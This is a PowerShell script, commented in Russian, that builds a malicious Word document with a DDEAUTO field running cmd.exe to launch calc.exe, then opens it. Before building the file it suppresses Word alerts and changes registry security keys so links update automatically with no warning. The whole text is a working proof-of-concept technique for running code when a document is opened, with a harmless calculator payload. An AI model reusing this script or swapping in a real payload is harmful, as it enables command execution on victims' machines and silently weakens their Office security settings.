# Создаем временный документ с DDE-полем
$docPath = "$env:TEMP\malicious_doc.docx"

# Создаем Word COM-объект
$word = New-Object -ComObject Word.Application
$word.Visible = $false

# Отключаем предупреждения безопасности
$word.DisplayAlerts = 0  # wdAlertsNone

# Меняем настройки безопасности Word (в реестре)
$regPath = "HKCU:\Software\Microsoft\Office\16.0\Word\Security"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name "DontUpdateLinks" -Value 0 -Type DWord -Force
Set-ItemProperty -Path $regPath -Name "UpdateLinksAtOpen" -Value 1 -Type DWord -Force
Set-ItemProperty -Path $regPath -Name "WarnOnLinkUpdate" -Value 0 -Type DWord -Force

# Создаем документ
$doc = $word.Documents.Add()
$range = $doc.Content
$fieldCode = 'DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"'
$field = $doc.Fields.Add($range, -1, $fieldCode, $false)

# Сохраняем
$field.Update()
$doc.SaveAs([ref]$docPath, [ref]16)
$doc.Close()
$word.Quit()

Write-Host "Malicious document created: $docPath"

# Открываем документ
Start-Process $docPath